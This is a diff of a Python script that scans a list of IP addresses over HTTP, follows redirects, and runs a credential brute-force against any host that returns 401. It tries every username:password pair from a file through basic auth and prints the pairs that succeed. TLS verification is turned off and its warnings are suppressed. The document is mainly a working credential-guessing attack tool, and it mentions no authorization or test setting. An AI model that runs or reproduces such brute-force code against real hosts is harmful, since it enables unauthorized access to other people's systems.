@@ -1,56 +1,68 @@
 import requests
 
+requests.packages.urllib3.disable_warnings()
 
 def read_file(filename):
 	return list(open(filename, 'r'))
 
 
 def check_status(url):
-	req = requests.head(url, verify=False)
-	return req.status_code
+	try:
+		req = requests.head(url, verify=False)
+		return req.status_code
+	except Exception as e:
+		print(e)
+		return 0
+
+def check_location(url):
+	try:
+		req = requests.head(url, verify=False)
+		location = req.headers["location"]
+		host = url.strip("https:/")
+		if host in location:
+			return location
+		else:
+			return url + location
+
+	except Exception as e:
+		print(e)
+		return " "
+
+def get_body(url):
+	r = requests.get(url)
+	text = r.text
 
 
 def analyze(url, auth_list):
 	code = check_status(url)
+	print( int(code/100), end="")
 	if code == 200:
-		print(url, "--> ", code)
+		print(" ", end="")
 	elif 299 < code < 400:
-		print(url, "--> ", code)
+		location = check_location(url)
+		analyze(location, auth_list)
 	elif code == 401:
 		attack(url, auth_list)
-		print(url, "--> ", code)
 	else:
-		print(url, "--> OTHER CODE")
-		pass
+		print("!", end="")
 
 
 def attack(url, auth_list):
 	for pair in auth_list:
 		user, passwd = pair.split(":")
+		print("|", end="")
 		code = authenticate(url, user, passwd)
 		if code == 200:
-			print("\t", url, " --> AUTH --> ", code , " | ", user, " : ", passwd)
+			print("SUCCESS", user, passwd)
 		else:
-			print("\t", url, " --> AUTH --> ", code)
+			pass
+
 
 
 def authenticate(url, user, passwd):
+
 	req = requests.get(url, auth=(user, passwd))
 	return req.status_code
-
-
-# #r = requests.get('https://infinz.pl', auth=('user', 'pass'))
-# r = requests.head('http://www.infinz.pl', verify=False)
-#
-# print(r.status_code)
-#
-# if r.status_code == 301:
-# 	url = r.headers['location']
-# 	n = requests.head(url)
-# 	print(n.status_code)
-#
-#
-# #print(r.headers)
 
 
 def main():
@@ -58,12 +70,21 @@ def main():
 	ip_file = "ip.list"
 	auth_file = "auth.list"
 
-	iplist = read_file(ip_file)
+	ip_list = read_file(ip_file)
 	auth_list = read_file(auth_file)
 
-	for ip in iplist:
-		url = "http://" + ip
+	for ip in ip_list:
+		if len(ip.strip()) < 15:
+			nip = ip.strip()
+			for i in range(15-(len(nip))):
+				nip = nip + " "
+			print("\n",nip, end="\t")
+		else:
+			print("\n",ip.strip(), end="\t")
+		url = "http://" + ip.strip() + "/"
 		analyze(url, auth_list)
+
+	print(" ")
 
 
 if __name__ == "__main__":
